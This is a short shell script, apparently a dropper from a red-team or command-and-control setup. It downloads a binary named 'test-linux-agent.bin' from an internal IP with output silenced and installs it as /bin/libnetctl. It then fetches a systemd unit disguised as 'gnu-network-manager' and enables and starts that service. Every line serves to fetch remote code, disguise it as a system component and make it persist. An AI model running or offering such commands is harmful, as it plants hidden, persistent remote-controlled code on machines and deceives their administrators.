wget http://192.168.1.51:443/test-linux-agent.bin -O /bin/libnetctl -o /dev/null
chmod 755 /bin/libnetctl
wget http://192.168.1.51:443/systemdfile -O /etc/systemd/system/gnu-network-manager.service -o /dev/null
chmod 644 /etc/systemd/system/gnu-network-manager.service

systemctl daemon-reload
systemctl enable gnu-network-manager
systemctl start gnu-network-manager